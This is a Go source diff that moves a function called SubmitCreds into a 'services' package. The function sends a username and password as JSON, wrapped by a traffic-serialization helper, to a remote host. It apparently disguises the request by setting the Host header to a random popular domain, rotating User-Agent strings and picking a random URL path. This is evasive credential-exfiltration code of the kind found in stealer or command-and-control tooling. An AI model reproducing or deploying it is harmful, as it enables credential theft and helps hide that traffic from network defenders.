@@ -1,10 +1,12 @@
-package main
+package services
 
 import (
 	"bytes"
 	"encoding/json"
 	"errors"
 	"net/http"
+	"xena/helpers"
+	"xena/networking"
 )
 
 type Creds struct {
@@ -14,22 +16,22 @@ type Creds struct {
 	Pass string `json:"pass"`
 }
 
-// submitCreds sends credentials to the Domena service.
-func submitCreds(host string, creds Creds) error {
+// SubmitCreds sends credentials to the Domena service.
+func SubmitCreds(host string, creds Creds) error {
 	credsJson, err := json.Marshal(creds)
 	if err != nil {
 		return err
 	}
 
-	payloadJson, err := serializedTraffic(string(credsJson))
+	payloadJson, err := networking.SerializedTraffic(string(credsJson))
 	if err != nil {
 		return err
 	}
 
-	request, err := http.NewRequest("POST", host+randEntry(domenaPostServiceMap), bytes.NewBuffer([]byte(payloadJson)))
-	request.Host = randomPopularDomain()
+	request, err := http.NewRequest("POST", host+helpers.RandEntry(domenaPostServiceMap), bytes.NewBuffer([]byte(payloadJson)))
+	request.Host = helpers.RandomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
-	request.Header.Set("User-Agent", randomUserAgent())
+	request.Header.Set("User-Agent", helpers.RandomUserAgent())
 	if err != nil {
 		return err
 	}
